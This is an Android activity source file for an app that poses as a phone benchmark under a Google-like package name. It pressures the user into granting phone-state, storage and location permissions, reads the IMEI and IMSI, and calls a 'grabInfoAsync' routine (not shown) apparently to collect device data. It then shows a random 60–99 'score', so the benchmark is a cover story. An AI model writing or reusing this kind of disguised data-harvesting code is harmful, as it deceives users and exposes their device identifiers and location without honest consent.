package com.google.applicationgui;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.support.annotation.NonNull;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.google.applicationgui.view.LoadingView;

import network.Manager;

public class MainActivity extends Activity {

    private LoadingView loadingView;

    private TextView buildModelTextView;
    private TextView deviceIdTextView;
    private TextView subscriberIdTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 未捕捉异常
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override
            public void uncaughtException(Thread thread, Throwable e) {
                Log.d("DeviceInfo", "-------------- uncaughtException --------------");
                e.printStackTrace();
                Log.d("DeviceInfo", "-------------- uncaughtException --------------");
            }
        });

        // 申请权限
        boolean isAllRuntimePermissionGranted = checkRuntimePermissions();

        // Views
        buildModelTextView = findViewById(R.id.buildModelTextView);
        deviceIdTextView = findViewById(R.id.deviceIdTextView);
        subscriberIdTextView = findViewById(R.id.subscriberIdTextView);

        setDeviceInformation();

        // 开始
        loadingView = findViewById(R.id.loadingView);
        loadingView.setVisibility(View.INVISIBLE);

        loadingView.setVisibility(View.VISIBLE);
        loadingView.selectedShapeId = R.drawable.shape_circle_deeppink;
        loadingView.selectedSvgId = R.drawable.svg_loading_tadpole_green;
        loadingView.stopAnimation();
        loadingView.setLoadingText("准备评分，请赋予所有权限...");
        subscriberIdTextView.setText("准备评分，请赋予所有权限...");

        if (isAllRuntimePermissionGranted) {
            startGrab();
        }

    }

    public boolean checkRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
            ) {
                android.support.v4.app.ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.INTERNET,

                        Manifest.permission.READ_PHONE_STATE,

                        Manifest.permission.ACCESS_WIFI_STATE,
                        Manifest.permission.CHANGE_WIFI_STATE,

                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,

                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION,

//                    Manifest.permission.CAMERA,
//                    Manifest.permission.READ_SMS,
//
//                    Manifest.permission.READ_CONTACTS,
//                    Manifest.permission.WRITE_CONTACTS,
//
//                    Manifest.permission.BODY_SENSORS,
//                    Manifest.permission.RECORD_AUDIO,

                }, 1000);
                return false;
            } else {
                return true;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == 1000) {
            boolean isAllgranted = true;
            for (int grantResult : grantResults) {
                isAllgranted = isAllgranted && (grantResult == PackageManager.PERMISSION_GRANTED);
            }
            if (!isAllgranted) {
                Toast.makeText(this, "请先赋予所有权限并重新打开APP，再跑分!", Toast.LENGTH_LONG).show();

                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        finish();
                    }
                }, 1000);

            } else {
                setDeviceInformation();

                startGrab();
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }


    private void setDeviceInformation() {
        buildModelTextView.setText(Build.MANUFACTURER + " - " + Build.MODEL);
        try {
            String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
            String imsi = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSubscriberId();
            deviceIdTextView.setText("IMEI: " + imei);
            subscriberIdTextView.setText("IMSI: " + imsi);
        } catch (SecurityException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startGrab() {
        deviceIdTextView.setText("");
        subscriberIdTextView.setText("");

        loadingView.startAnimation();
        loadingView.setLoadingText("评分中...");

        final int[] count = new int[1];
        final boolean[] isDone = new boolean[]{false};
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isDone[0]) {
                    count[0]++;
                    loadingView.setLoadingText("评分中" + count[0] + "s...");
                    new Handler(Looper.getMainLooper()).postDelayed(this, 1000);
                }
            }
        }, 1000);

        Manager.grabInfoAsync(new Manager.GrabInfoAsyncCallback() {
            @Override
            public void done() {


                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {

                        isDone[0] = true;
                        int mark = new java.util.Random().nextInt(40) + 60;
                        loadingView.setLoadingText("本次得分: " + mark + "分");
                        loadingView.stopAnimation();

                        deviceIdTextView.setText("");
                        subscriberIdTextView.setText("本次得分: " + mark + "分");

                    }
                });
            }
        });

    }

}
